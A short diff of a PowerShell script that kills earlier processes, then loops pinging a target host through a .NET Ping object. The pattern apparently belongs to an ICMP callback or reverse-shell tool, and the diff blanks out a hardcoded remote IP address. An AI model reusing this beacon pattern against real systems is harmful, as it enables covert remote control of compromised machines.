@@ -41,7 +41,7 @@ Function Stop-PreviousProcesses {
 }
 
 Stop-PreviousProcesses
-$sleep = 10; $target = "104.248.16.121"
+$sleep = 10; $target = ""
 while ($true) {
     if (Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet -ErrorAction SilentlyContinue) {
         $ICMPClient = New-Object System.Net.NetworkInformation.Ping
